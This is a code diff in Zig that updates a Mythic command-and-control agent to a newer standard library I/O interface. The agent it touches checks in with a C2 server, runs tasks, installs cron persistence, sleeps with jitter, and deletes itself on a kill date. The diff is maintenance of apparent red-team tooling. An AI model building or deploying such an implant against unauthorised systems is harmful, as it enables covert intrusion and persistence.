@@ -9,6 +9,7 @@ const config = @import("config.zig");
 const print = std.debug.print;
 //const ArrayList = std.ArrayList;
 const Allocator = std.mem.Allocator;
+const Io = std.Io;
 const json = std.json;
 const time = std.time;
 
@@ -27,6 +28,7 @@ pub const MythicAgent = struct {
     const Self = @This();
 
     allocator: Allocator,
+    io: Io,
     config: AgentConfig,
     uuid: []const u8,
     session_id: []const u8,
@@ -38,32 +40,33 @@ pub const MythicAgent = struct {
     aes_key: [32]u8, //For future use watch this space
     payload_uuid: []const u8,
 
-    tasks: std.ArrayListUnmanaged(MythicTask),
-    pending_responses: std.ArrayListUnmanaged(MythicResponse),
+    tasks: std.ArrayList(MythicTask),
+    pending_responses: std.ArrayList(MythicResponse),
     is_running: bool,
-    last_checkin: i64,
+    last_checkin: Io.Timestamp,
 
-    pub fn init(allocator: Allocator, agent_config: types.AgentConfig) !Self {
+    pub fn init(allocator: Allocator, agent_config: types.AgentConfig, io: Io, environ_map: *std.process.Environ.Map) !Self {
         var crypto_utils = CryptoUtils.init(allocator);
 
-        const session_id = try crypto_utils.generateSessionId(); //session_id might be useful later. Not implemented yet
-        const aes_key = CryptoUtils.generateAESKey();
+        const session_id = try crypto_utils.generateSessionId(io); //session_id might be useful later. Not implemented yet
+        const aes_key = CryptoUtils.generateAESKey(io);
 
         return Self{
             .allocator = allocator,
+            .io = io,
             .config = agent_config,
             .uuid = config.uuid,
             .session_id = session_id,
-            .network_client = NetworkClient.init(allocator, agent_config),
-            .command_executor = CommandExecutor.init(allocator),
-            .system_info = SystemInfo.init(allocator),
+            .network_client = NetworkClient.init(allocator, agent_config, io),
+            .command_executor = CommandExecutor.init(allocator, io),
+            .system_info = SystemInfo.init(allocator, io, environ_map),
             .crypto_utils = crypto_utils,
             .aes_key = aes_key,
             .payload_uuid = config.payload_uuid,
-            .tasks = std.ArrayListUnmanaged(MythicTask){},
-            .pending_responses = std.ArrayList(MythicResponse){},
+            .tasks = std.ArrayList(MythicTask).empty,
+            .pending_responses = std.ArrayList(MythicResponse).empty,
             .is_running = false,
-            .last_checkin = 0,
+            .last_checkin = Io.Timestamp{ .nanoseconds = 0 },
         };
     }
 
@@ -79,7 +82,7 @@ pub const MythicAgent = struct {
 
         try self.checkin();
         // Install persistence after first check-in
-        const exepath = try std.fs.selfExePathAlloc(self.allocator);
+        const exepath = try std.process.executablePathAlloc(self.io, self.allocator);
         defer self.allocator.free(exepath);
 
         //There is a bug where if you use zyra, the path is different from where
@@ -97,15 +100,15 @@ pub const MythicAgent = struct {
         } else {
             // Here is where we should check if a cron job exists for this exepath
             // If it doesn't, we install one
-            const cron_exists = try PersistUtils.get_cron_entries(self.allocator);
+            const cron_exists = try PersistUtils.get_cron_entries(self.allocator, self.io);
             if (cron_exists == null or cron_exists.?.len == 0) {
-                PersistUtils.install_cron(exepath, self.allocator) catch |err| {
+                PersistUtils.install_cron(exepath, self.allocator, self.io) catch |err| {
                     std.debug.print("{}", .{err});
                 };
             } else {
                 const cron_path = cron_exists.?;
                 if (!std.mem.eql(u8, cron_path, exepath)) {
-                    PersistUtils.update_cron_entry(cron_path, exepath, self.allocator) catch |err| {
+                    PersistUtils.update_cron_entry(cron_path, exepath, self.allocator, self.io) catch |err| {
                         std.debug.print("{}", .{err});
                     };
                 } else {
@@ -115,16 +118,16 @@ pub const MythicAgent = struct {
         }
         while (self.is_running) {
             if (self.config.kill_date) |kill_date| {
-                if (TimeUtils.isKillDateReached(kill_date)) {
+                if (TimeUtils.isKillDateReached(kill_date, self.io)) {
                     //we'll try to make the binary remove persistence and self delete
-                    const exe_path = try std.fs.selfExePathAlloc(self.allocator);
+                    const exe_path = try std.process.executablePathAlloc(self.io, self.allocator);
                     defer self.allocator.free(exe_path);
 
-                    PersistUtils.remove_cron_entry(exe_path, self.allocator) catch |err| {
+                    PersistUtils.remove_cron_entry(exe_path, self.allocator, self.io) catch |err| {
                         print("{}", .{err});
                     };
 
-                    std.fs.deleteFileAbsolute(exe_path) catch |err| {
+                    std.Io.Dir.deleteFileAbsolute(self.io, exe_path) catch |err| {
                         print("{}", .{err});
                     };
                     std.process.exit(0);
@@ -141,7 +144,7 @@ pub const MythicAgent = struct {
                 print("{}", .{err});
             };
 
-            self.sleep();
+            try self.sleep();
         }
     }
 
@@ -182,7 +185,7 @@ pub const MythicAgent = struct {
         const json_bytes = try json_writer.toOwnedSlice();
         defer self.allocator.free(json_bytes);
 
-        var combined = std.ArrayList(u8){};
+        var combined = std.ArrayList(u8).empty;
         defer combined.deinit(self.allocator);
         try combined.appendSlice(self.allocator, self.payload_uuid);
         try combined.appendSlice(self.allocator, json_bytes);
@@ -222,7 +225,7 @@ pub const MythicAgent = struct {
             return error.InvalidResponse;
         }
 
-        self.last_checkin = TimeUtils.getCurrentTimestamp();
+        self.last_checkin = TimeUtils.getCurrentTimestamp(self.io);
     }
 
     fn getTasks(self: *Self) !void {
@@ -239,7 +242,7 @@ pub const MythicAgent = struct {
         const json_bytes = try json_writer.toOwnedSlice();
         defer self.allocator.free(json_bytes);
 
-        var combined = std.ArrayList(u8){};
+        var combined = std.ArrayList(u8).empty;
         defer combined.deinit(self.allocator);
 
         try combined.appendSlice(self.allocator, self.payload_uuid);
@@ -355,7 +358,7 @@ pub const MythicAgent = struct {
             download: ?types.DownloadInfo = null,
         };
 
-        var responses = std.ArrayList(ResponseObj){};
+        var responses = std.ArrayList(ResponseObj).empty;
         defer responses.deinit(self.allocator);
 
         for (self.pending_responses.items) |response| {
@@ -380,7 +383,7 @@ pub const MythicAgent = struct {
         const json_bytes = try json_writer.toOwnedSlice();
         defer self.allocator.free(json_bytes);
 
-        var combined = std.ArrayList(u8){};
+        var combined = std.ArrayList(u8).empty;
         defer combined.deinit(self.allocator);
 
         try combined.appendSlice(self.allocator, self.payload_uuid);
@@ -398,8 +401,8 @@ pub const MythicAgent = struct {
         self.pending_responses.clearAndFree(self.allocator);
     }
 
-    fn sleep(self: *Self) void {
-        const sleep_time = TimeUtils.calculateJitteredSleep(self.config.sleep_interval, self.config.jitter);
-        TimeUtils.sleep(sleep_time);
+    fn sleep(self: *Self) !void {
+        const sleep_time = TimeUtils.calculateJitteredSleep(self.config.sleep_interval, self.config.jitter, self.io);
+        try TimeUtils.sleep(self.io, sleep_time);
     }
 };
